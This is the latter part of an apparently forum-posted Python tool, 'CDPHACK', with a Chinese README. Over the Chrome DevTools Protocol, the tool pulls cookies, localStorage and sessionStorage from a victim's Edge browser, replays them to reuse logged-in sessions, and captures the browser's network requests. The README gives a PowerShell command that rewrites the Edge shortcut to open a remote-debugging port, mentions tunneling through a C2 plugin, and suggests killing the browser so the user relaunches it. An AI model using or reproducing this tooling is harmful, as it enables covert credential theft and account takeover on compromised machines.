                target_page["webSocketDebuggerUrl"],
                target_page["origin"],
                start_network_listener=False  # 不启动网络监听
            )
            Colors.print_success("页面连接成功，提取凭证中...")

            # 提取凭证数据
            cookies, local_storage, session_storage = await cdp_requester.extract_credentials(
                target_domain=target_page["domain"]
            )

            # 显示凭证（预览）
            Colors.print_title(f"已提取 {target_page['domain']} 的凭证（预览）")

            # 1. Cookie列表（预览）
            print(f"\n{Colors.BOLD}{Colors.CYAN}[1/3] Cookie列表（值预览）:{Colors.RESET}")
            if not cookies:
                print(f"   {Colors.RED}❌ 未提取到Cookie{Colors.RESET}")
            else:
                print("   " + "-"*76)
                print(f"   {Colors.BLUE}{'编号':<6} {'名称':<15} {'长度':<6} {'域':<20} {'值预览'}{Colors.RESET}")
                print("   " + "-"*76)
                for idx, c in enumerate(cookies, 1):
                    val_preview = c['value'][:20] + "..." if len(c['value']) > 20 else c['value']
                    print(f"   {idx:<6} {c['name'][:15]:<15} {c['total_length']:<6} {c['domain'][:20]:<20} {val_preview}")
                print("   " + "-"*76)

            # 2. localStorage列表（预览）
            print(f"\n{Colors.BOLD}{Colors.CYAN}[2/3] localStorage列表（值预览）:{Colors.RESET}")
            if not local_storage:
                print(f"   {Colors.RED}❌ 未提取到localStorage数据{Colors.RESET}")
            else:
                print(f"   共{len(local_storage)}个键值对:")
                print("   " + "-"*76)
                print(f"   {Colors.BLUE}{'编号':<6} {'键名':<20} {'值长度':<8} {'值预览（前30字符）'}{Colors.RESET}")
                print("   " + "-"*76)
                for idx, (k, v) in enumerate(local_storage.items(), 1):
                    val_preview = v[:30] + "..." if len(v) > 30 else v
                    print(f"   {idx:<6} {k[:20]:<20} {len(v):<8} {val_preview}")
                print("   " + "-"*76)

            # 3. sessionStorage列表（预览）
            print(f"\n{Colors.BOLD}{Colors.CYAN}[3/3] sessionStorage列表（值预览）:{Colors.RESET}")
            if not session_storage:
                print(f"   {Colors.RED}❌ 未提取到sessionStorage数据{Colors.RESET}")
            else:
                print(f"   共{len(session_storage)}个键值对:")
                print("   " + "-"*76)
                print(f"   {Colors.BLUE}{'编号':<6} {'键名':<20} {'值长度':<8} {'值预览（前30字符）'}{Colors.RESET}")
                print("   " + "-"*76)
                for idx, (k, v) in enumerate(session_storage.items(), 1):
                    val_preview = v[:30] + "..." if len(v) > 30 else v
                    print(f"   {idx:<6} {k[:20]:<20} {len(v):<8} {val_preview}")
                print("   " + "-"*76)

            # 操作选择（a-请求URL / b-打印完整凭证）
            while True:
                action_after_extract = input(f"\n{Colors.CYAN}请选择操作（请求其他URL(a)/打印所有凭证(b)）：{Colors.RESET}").strip().lower()
                if action_after_extract in ["a", "b"]:
                    break
                Colors.print_error("输入错误，请输入 'a' 或 'b'")

            # 分支1：打印完整凭证
            if action_after_extract == "b":
                cdp_requester._print_full_credentials(cookies, local_storage, session_storage, target_page["domain"])
                Colors.print_success("完整凭证打印完成")
                return

            # 分支2：请求其他URL
            # 选择Cookie
            selected_cookies = {}
            if cookies:
                while True:
                    nums = input(f"\n{Colors.CYAN}输入Cookie编号（1-{len(cookies)}，逗号分隔）: {Colors.RESET}").strip()
                    if not nums:
                        break
                    try:
                        indices = [int(n)-1 for n in nums.split(",")]
                        selected_cookies = {cookies<i>["name"]: cookies<i>["value"] for i in indices}
                        break
                    except:
                        Colors.print_error(f"格式错误，输入1-{len(cookies)}的数字（逗号分隔）")

            # 选择localStorage
            selected_local = {}
            if local_storage:
                nums = input(f"{Colors.CYAN}输入localStorage编号（1-{len(local_storage)}，逗号分隔）: {Colors.RESET}").strip()
                if nums:
                    try:
                        indices = [int(n)-1 for n in nums.split(",")]
                        selected_local = {list(local_storage.items())<i>[0]: list(local_storage.items())<i>[1] for i in indices}
                    except:
                        Colors.print_error(f"格式错误，输入1-{len(local_storage)}的数字（逗号分隔）")

            # 选择sessionStorage
            selected_session = {}
            if session_storage:
                nums = input(f"{Colors.CYAN}输入sessionStorage编号（1-{len(session_storage)}，逗号分隔）: {Colors.RESET}").strip()
                if nums:
                    try:
                        indices = [int(n)-1 for n in nums.split(",")]
                        selected_session = {list(session_storage.items())<i>[0]: list(session_storage.items())<i>[1] for i in indices}
                    except:
                        Colors.print_error(f"格式错误，输入1-{len(session_storage)}的数字（逗号分隔）")

            # 输入目标URL并请求
            target_url = input(f"\n{Colors.CYAN}输入目标URL: {Colors.RESET}").strip()
            if not target_url.startswith(("http://", "https://")):
                Colors.print_error("URL格式错误（需以http://或https://开头）")
                return

            print(f"\n{Colors.BLUE}请求中...{Colors.RESET}")
            resp = await cdp_requester.send_request(target_url, selected_cookies, selected_local, selected_session)
            print(f"\n{Colors.GREEN}状态码{Colors.RESET}: {resp['status_code']}")
            print(f"{Colors.GREEN}最终URL{Colors.RESET}: {resp['final_url']}")
            print(f"{Colors.GREEN}响应长度{Colors.RESET}: {resp['content_length']}字符")

            # 显示响应内容
            if input(f"{Colors.CYAN}显示响应内容？(y/n): {Colors.RESET}").strip().lower() == "y":
                if resp['content_length'] > 5000:
                    print(f"\n响应内容（前5000字符）:\n{resp['content'][:5000]}...")
                else:
                    print(f"\n响应内容:\n{resp['content']}")


        else:
            # 操作b：获取网络选项卡请求
            print(f"\n{Colors.BLUE}[6/6] 连接页面：{target_page['title']}（{target_page['domain']}）...{Colors.RESET}")
            await cdp_requester.connect_to_page(
                target_page["webSocketDebuggerUrl"],
                target_page["origin"],
                start_network_listener=True  # 启动网络监听
            )
            Colors.print_success("页面连接成功，已启动网络请求监听")
            print(f"{Colors.YELLOW}⚠️  请在远程页面触发请求（如刷新页面/点击按钮）{Colors.RESET}")
            input(f"{Colors.CYAN}触发请求后，请等待5秒（确保请求完成），然后按回车键整理列表...{Colors.RESET}")

            # 额外等待2秒确保所有响应都已接收
            print(f"{Colors.BLUE}等待剩余响应数据...{Colors.RESET}")
            await asyncio.sleep(2)

            # 处理并查看网络请求
            await cdp_requester.handle_network_requests()

    except Exception as e:
        Colors.print_error(f"操作失败: {str(e)}")
        # 打印详细错误信息用于调试
        print(traceback.format_exc())
    finally:
        await cdp_requester.disconnect()
        Colors.print_info("已断开所有连接")


if __name__ == "__main__":
    # 启动Edge命令（必须执行！）
    # "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --remote-debugging-port=9222 --remote-allow-origins=* --disable-web-security --user-data-dir="C:\edge-remote-cdp"
    asyncio.run(main())

'''

CDPHACK From t00ls
介绍
一款基于 Chrome DevTools Protocol（CDP 协议） 的浏览器调试与数据捕获工具（命名为 CDPHACK），核心用于远程控制浏览器、提取凭证信息和捕获网络请求。

核心功能：

1.浏览器凭证提取：获取目标页面的 Cookie、localStorage、sessionStorage（用户身份、会话信息等关键数据）；

2.凭证复用请求：用提取的凭证（如 Cookie）模拟发送 HTTP 请求，复用目标浏览器的登录状态；

3.网络请求劫持：实时捕获目标浏览器的网络请求（排除图片 / 字体等非关键资源），并查看请求 / 响应详情（头信息、参数、响应内容）。

PS：这个工具的产生是因为目标不知道做了什么奇葩限制，导致换设备就上不去后台（非IP白名单什么的技术）

前置条件

1.能在目标设备开启隧道代理

开启隧道代理的方法就不说了，我是直接用的C2自带的插件一键化搞的，，

2.能在目标设备开启cdp：

--remote-debugging-port=9222 --user-data-dir="C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data" --disable-web-security --remote-allow-origins
目标设备找一下指定浏览器快捷方式：

for /r C:\ %i in ("Microsoft Edge.lnk") do @if exist "%i" echo %i
然后修改快捷方式的目标指向：

powershell -Command "$shell = New-Object -ComObject WScript.Shell; $lnk = $shell.CreateShortcut('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk'); $lnk.TargetPath = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; $lnk.Arguments = '--remote-debugging-port=9222 --user-data-dir=""""C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data""""'; $lnk.Save()"
修改成功后，等待用户关闭浏览器下一次再通过快捷方式打开时就会自动开启cdp协议（也可以直接kill掉逼他重开）

'''
